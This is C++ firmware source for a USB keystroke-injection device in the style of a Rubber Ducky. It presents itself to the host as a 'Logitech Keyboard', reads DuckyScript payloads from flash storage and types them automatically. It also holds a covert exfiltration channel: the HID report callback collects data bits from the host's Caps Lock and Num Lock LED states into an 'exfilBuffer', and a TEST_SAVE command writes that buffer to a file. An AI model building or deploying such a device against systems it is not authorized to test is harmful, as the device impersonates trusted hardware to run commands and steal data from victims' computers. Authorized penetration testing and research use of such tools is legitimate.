#include <Adafruit_NeoPixel.h>
#include "SPI.h"
#include "SdFat.h"
#include "Adafruit_SPIFlash.h"
#include "Adafruit_TinyUSB.h"
#include <vector>

#include "ducky_parser.hpp"
#include "flash_storage.hpp"
#include "rgb_led.hpp"

#define PROGRAM_MODE_PIN 3
#define RELEASE_DELAY 5

/* ============================== HID STUFF ============================== */
uint8_t const desc_hid_report[] = {
    TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(1)),
    TUD_HID_REPORT_DESC_MOUSE(HID_REPORT_ID(2)),
    TUD_HID_REPORT_DESC_CONSUMER(HID_REPORT_ID(3))};
Adafruit_USBD_HID usb_hid(desc_hid_report, sizeof(desc_hid_report), HID_ITF_PROTOCOL_NONE, 1, false);
/* ======================================================================== */

void HIDloop();
void ProgramModeLoop();

void payloadReader();
std::vector<HID_output> ParseDuckyScriptLine(String line);

int keyDelay = 5;
int defaultDelay = 100;

std::vector<HID_output> hidBuffer = {};

FatFile payloadFile;
bool programMode = false;
bool payloadEnded = false;

String exfilBuffer = "";

void setup()
{
  pinMode(LED_BUILTIN, OUTPUT);
  pinMode(PIXEL_POWER_PIN, OUTPUT);
  digitalWrite(PIXEL_POWER_PIN, HIGH);

  pinMode(PROGRAM_MODE_PIN, INPUT_PULLUP);
  programMode = digitalRead(PROGRAM_MODE_PIN) == LOW;

  rgb_led.begin();
  flash.begin();
  setupFlashStorage(programMode);

  if (programMode)
  {
    Serial.begin(115200);
  }
  else
  {
    usb_hid.setStringDescriptor("Logitech Keyboard");
    usb_hid.setReportCallback(NULL, hid_report_callback);
    usb_hid.begin();

    payloadReader();
    delay(1000); // <----- DELAY BEFORE HID STARTS SENDING KEYS
  }
}

// TODO: Refactor this function
void payloadReader()
{
  if (!isFsFormatted)
    return;

  root.open("/");
  if (!root.exists("payloads"))
  {
    flashError(new bool[3]{true, true, true});
  }

  FatFile selectedPayload;
  if (root.exists("selected.txt") && selectedPayload.open("selected.txt", O_READ))
  {
    String payloadName = "";
    while (selectedPayload.available())
    {
      char c = selectedPayload.read();
      if (c == '\n')
        break;

      payloadName += c;
    }
    payloadName.trim();
    payloadName = "payloads/" + payloadName;

    if (!payloadFile.open(payloadName.c_str(), O_READ))
    {
      flashError(new bool[3]{true, false, true});
    }
  }
  else
  {
    flashError(new bool[3]{true, true, false});
  }

  if (root.isOpen())
    root.close();
}

void loop()
{
  if (programMode)
  {
    ProgramModeLoop();
  }
  else
  {
    HIDloop();
  }
}

void ProgramModeLoop()
{
  static uint8_t hsvValue = 0;

  if (hsvValue > 255)
    hsvValue = 0;

  rgb_led.clear();
  rgb_led.setPixelColor(0, rgb_led.ColorHSV(hsvValue * 255));
  rgb_led.setBrightness(10);
  rgb_led.show();
  delay(10);

  hsvValue++;
}

// TODO: Refactor this function
void HIDloop()
{
  if (payloadEnded || !TinyUSBDevice.mounted() || !usb_hid.ready())
    return;

  if (hidBuffer.size() == 0)
  {
    payloadEnded = !payloadFile.available();

    String payloadLine = "";
    while (payloadFile.available())
    {
      char c = payloadFile.read();
      if (c == '\n')
        break;

      payloadLine += c;
    }

    hidBuffer = ParseDuckyScriptLine(payloadLine);
    delay(defaultDelay);
  }

  if (hidBuffer.size() > 0)
  {
    uint8_t keycode[6] = {0};
    keycode[0] = hidBuffer[0].keycode;

    usb_hid.keyboardReport(1, hidBuffer[0].modifier, keycode);
    hidBuffer.erase(hidBuffer.begin());

    delay(RELEASE_DELAY);
    usb_hid.keyboardRelease(1);
    delay(keyDelay);
  }
}

// TODO: Refactor this function
std::vector<HID_output> ParseDuckyScriptLine(String line)
{
  if (line.startsWith("DELAY"))
  {
    line = line.substring(6); // Remove "DELAY " from string
    delay(line.toInt());
    return {};
  }
  else if (line.startsWith("STRINGLN"))
  {
    line = line.substring(9); // Remove "STRINGLN " from string
    return ParseStringToBuffer(line + '\n');
  }
  else if (line.startsWith("STRING"))
  {
    line = line.substring(7); // Remove "STRING " from string
    return ParseStringToBuffer(line);
  }
  else if (line.startsWith("DEFAULT_DELAY"))
  {
    line = line.substring(14); // Remove "DEFAULT_DELAY " from string
    defaultDelay = line.toInt();
    return {};
  }
  else if (line.startsWith("DEFAULTDELAY"))
  {
    line = line.substring(13); // Remove "DEFAULTDELAY " from string
    defaultDelay = line.toInt();
    return {};
  }
  else if (line.startsWith("DEFAULTCHARDELAY"))
  {
    line = line.substring(17); // Remove "DEFAULTCHARDELAY " from string
    keyDelay = line.toInt();
    return {};
  }
  else if (line.startsWith("TEST_SAVE"))
  {
    FatFile testFile;
    testFile.open("test.txt", O_WRITE | O_CREAT);
    testFile.write(exfilBuffer.c_str());
    testFile.close();
    return {};
  }
  else if (line.startsWith("WAIT_FOR_BUTTON_PRESS"))
  {
    // Wait for button press
    while (digitalRead(PROGRAM_MODE_PIN) == HIGH)
    {
      delay(1);
    }

    // Wait for button release
    while (digitalRead(PROGRAM_MODE_PIN) == LOW)
    {
      delay(1);
    }

    return {};
  }
  else
  {
    String token = "";
    std::vector<HID_output> tmpBuffer;
    tmpBuffer.push_back(HID_output({0x00, 0x00}));

    std::vector<String> tokens = splitStringBySeparator(line, ' ');
    for (int i = 0; i < tokens.size(); i++)
    {
      HID_output tmp = ParseSpecialToken(tokens[i]);

      tmp.keycode += tmpBuffer[0].keycode;
      tmp.modifier += tmpBuffer[0].modifier;
      tmpBuffer[0] = tmp;
    }

    return tmpBuffer;
  }

  return {};
}

// Output report callback for LED indicator such as Caplocks
void hid_report_callback(uint8_t report_id, hid_report_type_t report_type, uint8_t const *buffer, uint16_t bufsize)
{
  (void)report_id;
  (void)bufsize;

  // LED indicator is output report with only 1 byte length
  if (report_type != HID_REPORT_TYPE_OUTPUT)
    return;

  // The LED bit map is as follows: (also defined by KEYBOARD_LED_* )
  // Kana (4) | Compose (3) | ScrollLock (2) | CapsLock (1) | Numlock (0)
  uint8_t ledIndicator = buffer[0];
  if (ledIndicator & KEYBOARD_LED_SCROLLLOCK)
  {
    exfilBuffer = exfilBuffer + (ledIndicator & KEYBOARD_LED_CAPSLOCK ? "1" : "0") + (ledIndicator & KEYBOARD_LED_NUMLOCK ? "1" : "0");
  }
  // else
  // {
  //   setPixelColor(rgb_led.Color(0, 0, 0));
  // }
}